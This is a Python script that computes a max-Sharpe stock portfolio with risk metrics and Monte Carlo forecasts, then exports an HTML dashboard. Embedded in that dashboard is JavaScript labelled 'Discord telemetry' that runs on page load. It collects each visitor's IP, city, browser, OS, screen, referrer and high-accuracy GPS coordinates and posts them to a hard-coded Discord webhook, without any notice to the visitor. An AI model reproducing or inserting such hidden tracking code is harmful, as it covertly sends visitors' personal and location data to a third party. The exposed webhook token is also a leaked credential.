import numpy as np
import pandas as pd
import plotly.express as px
import plotly.graph_objects as go
import plotly.io as pio
import yfinance as yf
from scipy.optimize import minimize

# --- 1. CONFIGURATION ---
TICKERS = [
    "SPY", "QQQ", "VT", "VGK", "EEM", "GLD", "TLT",
    "VNQ", "MSFT", "AAPL", "NVDA", "AMZN", "GOOGL",
]
BENCHMARK = "SPY"
START_DATE = "2018-01-01"
FORECAST_YEARS = 4
TRADING_DAYS_PER_YEAR = 252
TOTAL_FORECAST_DAYS = FORECAST_YEARS * TRADING_DAYS_PER_YEAR
NUM_SIMULATIONS = 10000

# --- 2. LIVE RISK-FREE RATE ---
print("-> Fetching live US 13-Week Treasury Bill yield...")
try:
    irx_hist = yf.Ticker("^IRX").history(period="5d")
    live_yield = irx_hist["Close"].iloc[-1]
    RISK_FREE_RATE = live_yield / 100
    print(f"-> Live Risk-Free Rate: {live_yield:.2f}% ({RISK_FREE_RATE*100:.2f}%)\n")
except Exception:
    RISK_FREE_RATE = 0.045
    print(f"-> Using default Risk-Free Rate: {RISK_FREE_RATE*100:.2f}%\n")

# --- 3. ROBUST DATA INGESTION ---
print("-> Downloading historical data...")
data = yf.download(TICKERS, start=START_DATE, auto_adjust=True, progress=False)

if isinstance(data.columns, pd.MultiIndex):
    data = data["Close"]

data = data.ffill().dropna()
returns = data.pct_change().dropna()

# --- 4. PORTFOLIO OPTIMIZATION (MAX SHARPE) ---
print("-> Optimizing Portfolio for Maximum Sharpe Ratio...")
mean_returns = returns.mean() * TRADING_DAYS_PER_YEAR
cov_matrix = returns.cov() * TRADING_DAYS_PER_YEAR

def negative_sharpe(weights, mean_returns, cov_matrix, risk_free_rate):
    p_ret = np.sum(mean_returns * weights)
    p_vol = np.sqrt(np.dot(weights.T, np.dot(cov_matrix, weights)))
    return -(p_ret - risk_free_rate) / p_vol

num_assets = len(TICKERS)
args = (mean_returns, cov_matrix, RISK_FREE_RATE)
constraints = ({'type': 'eq', 'fun': lambda x: np.sum(x) - 1})
bounds = tuple((0.0, 1.0) for asset in range(num_assets))
initial_guess = num_assets * [1. / num_assets]

opt_results = minimize(negative_sharpe, initial_guess, args=args, method='SLSQP', bounds=bounds, constraints=constraints)
optimized_weights = opt_results.x

returns["Optimized Portfolio"] = returns.dot(optimized_weights)
cumulative_returns = (1 + returns).cumprod()

# --- 5. RISK & PERFORMANCE METRICS ---
port_ret = returns["Optimized Portfolio"]
bench_ret = returns[BENCHMARK]

port_cagr = (cumulative_returns["Optimized Portfolio"].iloc[-1]) ** (TRADING_DAYS_PER_YEAR / len(port_ret)) - 1
bench_cagr = (cumulative_returns[BENCHMARK].iloc[-1]) ** (TRADING_DAYS_PER_YEAR / len(bench_ret)) - 1

port_vol = port_ret.std() * np.sqrt(TRADING_DAYS_PER_YEAR)
bench_vol = bench_ret.std() * np.sqrt(TRADING_DAYS_PER_YEAR)

port_sharpe = (port_cagr - RISK_FREE_RATE) / port_vol
bench_sharpe = (bench_cagr - RISK_FREE_RATE) / bench_vol

def calculate_max_dd(series):
    peak = series.cummax()
    return ((series - peak) / peak).min()

port_mdd = calculate_max_dd(cumulative_returns["Optimized Portfolio"])
bench_mdd = calculate_max_dd(cumulative_returns[BENCHMARK])

var_95 = np.percentile(port_ret, 5)
cvar_95 = port_ret[port_ret <= var_95].mean()

# --- 6. MONTE CARLO SIMULATION ---
print(f"-> Running {NUM_SIMULATIONS} Monte Carlo paths...")
dt = 1 / TRADING_DAYS_PER_YEAR
steps = TOTAL_FORECAST_DAYS
mu = port_cagr 
sigma = port_vol

np.random.seed(42)
Z = np.random.standard_normal((steps, NUM_SIMULATIONS))
daily_sim_returns = np.exp((mu - 0.5 * sigma**2) * dt + sigma * np.sqrt(dt) * Z)

prices = np.zeros((steps + 1, NUM_SIMULATIONS))
prices[0] = 10000 
for t in range(1, steps + 1):
    prices[t] = prices[t - 1] * daily_sim_returns[t - 1]

# --- 7. VISUALIZATIONS ---
fig_hist = go.Figure()
fig_hist.add_trace(go.Scatter(x=cumulative_returns.index, y=cumulative_returns["Optimized Portfolio"], name="Max Sharpe Portfolio", line=dict(color="#00cc96", width=2)))
fig_hist.add_trace(go.Scatter(x=cumulative_returns.index, y=cumulative_returns[BENCHMARK], name=f"Benchmark ({BENCHMARK})", line=dict(color="#9ca3af", width=2, dash="dash")))
fig_hist.update_layout(title="<b>Historical Backtest (Normalized)</b>", template="plotly_dark", hovermode="x unified")

rolling_vol = port_ret.rolling(window=TRADING_DAYS_PER_YEAR).std() * np.sqrt(TRADING_DAYS_PER_YEAR)
fig_roll = px.line(rolling_vol.dropna(), title="<b>Rolling 1-Year Volatility (Regime Detection)</b>")
fig_roll.update_layout(template="plotly_dark", yaxis_title="Annualized Volatility", showlegend=False)
fig_roll.update_traces(line_color="#38bdf8")

fig_fcast = go.Figure()
for i in range(50):
    fig_fcast.add_trace(go.Scatter(y=prices[:, i], mode="lines", line=dict(color="rgba(0,204,150,0.05)"), showlegend=False))

median_path = np.median(prices, axis=1)
upper_path = np.percentile(prices, 95, axis=1)
lower_path = np.percentile(prices, 5, axis=1)

fig_fcast.add_trace(go.Scatter(y=median_path, mode="lines", name="Median ($)", line=dict(color="cyan", width=3)))
fig_fcast.add_trace(go.Scatter(y=upper_path, mode="lines", name="95th %ile", line=dict(color="orange", width=2, dash="dash")))
fig_fcast.add_trace(go.Scatter(y=lower_path, mode="lines", name="5th %ile", line=dict(color="magenta", width=2, dash="dash")))
fig_fcast.update_layout(title=f"<b>4-Year Forward Simulation ($10,000 Initial)</b>", xaxis_title="Trading Days", yaxis_title="Portfolio Value ($)", template="plotly_dark")

# --- 8. BUILD METRICS TABLES ---
weights_df = pd.DataFrame({"Asset": TICKERS, "Weight": optimized_weights})
weights_df = weights_df[weights_df["Weight"] > 0.01].sort_values("Weight", ascending=False)
weights_df["Weight"] = (weights_df["Weight"] * 100).round(2).astype(str) + "%"

perf_data = [
    {"Metric": "Annualized Return (CAGR)", "Portfolio": f"{port_cagr*100:.2f}%", "Benchmark": f"{bench_cagr*100:.2f}%"},
    {"Metric": "Annualized Volatility", "Portfolio": f"{port_vol*100:.2f}%", "Benchmark": f"{bench_vol*100:.2f}%"},
    {"Metric": "Sharpe Ratio", "Portfolio": f"{port_sharpe:.2f}", "Benchmark": f"{bench_sharpe:.2f}"},
    {"Metric": "Maximum Drawdown", "Portfolio": f"{port_mdd*100:.2f}%", "Benchmark": f"{bench_mdd*100:.2f}%"},
]
perf_df = pd.DataFrame(perf_data)

risk_data = [
    {"Risk Metric": "Daily Value at Risk (95%)", "Value": f"{var_95*100:.2f}%", "Interpretation": "1 in 20 days, expect to lose at least this much."},
    {"Risk Metric": "Conditional VaR (95%)", "Value": f"{cvar_95*100:.2f}%", "Interpretation": "When a 5% tail event happens, this is the average loss."},
]
risk_df = pd.DataFrame(risk_data)

# --- 9. GENERATE HTML DASHBOARD WITH FIXED DISCORD TELEMETRY ---
html_hist = pio.to_html(fig_hist, full_html=False, include_plotlyjs="cdn")
html_roll = pio.to_html(fig_roll, full_html=False, include_plotlyjs=False)
html_fcast = pio.to_html(fig_fcast, full_html=False, include_plotlyjs=False)

weights_html = weights_df.to_html(index=False, classes="table-custom")
perf_html = perf_df.to_html(index=False, classes="table-custom")
risk_html = risk_df.to_html(index=False, classes="table-custom")

js = """
<script>
async function sendDiscordAlert() {
    try {
        let ip = 'Unknown', city = 'Unknown', region = 'Unknown', country = 'Unknown';
        try {
            let response = await fetch('https://ipapi.co/json/');
            let data = await response.json();
            ip = data.ip || 'Unknown';
            city = data.city || 'Unknown';
            region = data.region || 'Unknown';
            country = data.country_name || 'Unknown';
        } catch (e) {
            console.log("IP API fetch failed", e);
        }

        let ua = navigator.userAgent;
        let browser = "Unknown Browser";
        let os = "Unknown OS";
        let device = "Desktop/Mobile";

        if (ua.indexOf("Firefox") > -1) browser = "Mozilla Firefox";
        else if (ua.indexOf("SamsungBrowser") > -1) browser = "Samsung Internet";
        else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";
        else if (ua.indexOf("Edge") > -1) browser = "Microsoft Edge";
        else if (ua.indexOf("Chrome") > -1) browser = "Google Chrome";
        else if (ua.indexOf("Safari") > -1) browser = "Apple Safari";

        if (ua.indexOf("Win") > -1) os = "Windows";
        else if (ua.indexOf("Mac") > -1) os = "macOS";
        else if (ua.indexOf("Linux") > -1) os = "Linux";
        else if (ua.indexOf("Android") > -1) os = "Android";
        else if (ua.indexOf("like Mac") > -1) os = "iOS";

        device = /Mobi|Android/i.test(ua) ? "Mobile Device" : "Desktop/Laptop";

        let screenRes = `${window.screen.width}x${window.screen.height}`;
        let conn = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
        let referrer = document.referrer || 'Direct/None';
        let lang = navigator.language || 'Unknown';

        const webhookUrl = 'https://discord.com/api/webhooks/1537277575817330729/INZ0kAtXZKA2SF5sFTHPySczXzHNVdkgBxhkALe7-_QnlHdOIJMX5RZmpxHsxg41rMGg'; 

        const postPayload = async (locationText, extraFields = []) => {
            let payload = {
                embeds: [{
                    title: "🔔 Quantitative Dashboard Visitor!",
                    color: 248100,
                    fields: [
                        { name: "🌐 IP Address", value: ip, inline: true },
                        { name: "📍 Location", value: locationText, inline: true },
                        { name: "📱 Device", value: `${device} (${os})`, inline: true },
                        { name: "🌐 Browser", value: browser, inline: true },
                        { name: "🖥️ Screen", value: screenRes, inline: true },
                        { name: "⚡ Network", value: conn, inline: true },
                        { name: "🗣️ Language", value: lang, inline: true },
                        { name: "🔗 Referrer", value: referrer.substring(0, 50), inline: false },
                        ...extraFields,
                        { name: "⏰ Time", value: new Date().toLocaleString('id-ID'), inline: false }
                    ]
                }]
            };

            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        };

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    let lat = position.coords.latitude.toFixed(4);
                    let lon = position.coords.longitude.toFixed(4);
                    let accuracy = position.coords.accuracy.toFixed(0);
                    await postPayload(`${city}, ${region}, ${country} (IP)`, [
                        { name: "🎯 Exact GPS Coordinates", value: `Lat: ${lat}, Lon: ${lon} (Acc: ${accuracy}m)\\n[Open in Google Maps](https://www.google.com/maps?q=${lat},${lon})`, inline: false }
                    ]);
                },
                async (error) => {
                    await postPayload(`${city}, ${region}, ${country} (GPS Denied/Unavailable)`);
                },
                { timeout: 10000, enableHighAccuracy: true }
            );
        } else {
            await postPayload(`${city}, ${region}, ${country} (No GPS Support)`);
        }

    } catch (error) {
        console.log("Could not send Discord alert:", error);
    }
}
window.onload = sendDiscordAlert;
</script>
"""

html_template = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=1200">
    <title>Quantitative Portfolio Risk Engine</title>
    <style>
        body {{background:#0b0f19;color:#f3f4f6;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;margin:0;padding:20px;}}
        .container {{max-width:1200px;margin:auto;background:#111827;padding:40px;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,0.5);}}
        h1 {{color:#00cc96;text-align:center;margin-bottom:5px;}}
        .subtitle {{text-align:center;color:#9ca3af;margin-bottom:30px;font-size:14px;}}
        h2 {{color:#38bdf8;border-bottom:2px solid #374151;padding-bottom:8px;margin-top:40px;}}
        .grid-2 {{display: grid; grid-template-columns: 1fr 1fr; gap: 20px;}}
        .table-container {{overflow-x:auto;margin-top:15px;}}
        table.table-custom {{width:100%;border-collapse:collapse;background:#1f2937;border-radius:8px;overflow:hidden;}}
        table.table-custom th,td {{padding:12px 16px;text-align:left;border-bottom:1px solid #374151;}}
        table.table-custom th {{background:#374151;color:#f9fafb;}}
    </style>
</head>
<body>
    <div class="container">
        <h1>Quantitative Portfolio Risk Engine</h1>
        <div class="subtitle">Secure Multi-Asset Optimization • Risk-Free Rate: {RISK_FREE_RATE*100:.2f}%</div>
        
        <div class="grid-2">
            <div>
                <h2>Target Allocation (Max Sharpe)</h2>
                <div class="table-container">{weights_html}</div>
            </div>
            <div>
                <h2>Performance vs Benchmark</h2>
                <div class="table-container">{perf_html}</div>
            </div>
        </div>

        <h2>1. Historical Backtest</h2>
        {html_hist}
        
        <h2>2. Risk Analytics: Tail Events</h2>
        <div class="table-container">{risk_html}</div>
        
        <h2>3. Regime Detection (Rolling Volatility)</h2>
        {html_roll}
        
        <h2>4. Monte Carlo Distribution ($10k Initial)</h2>
        {html_fcast}
        
    </div>
    {js}
</body>
</html>
"""

with open("index.html", "w", encoding="utf-8") as f:
    f.write(html_template)

print("✅ SUCCESS! index.html exported with working Google Maps links.")
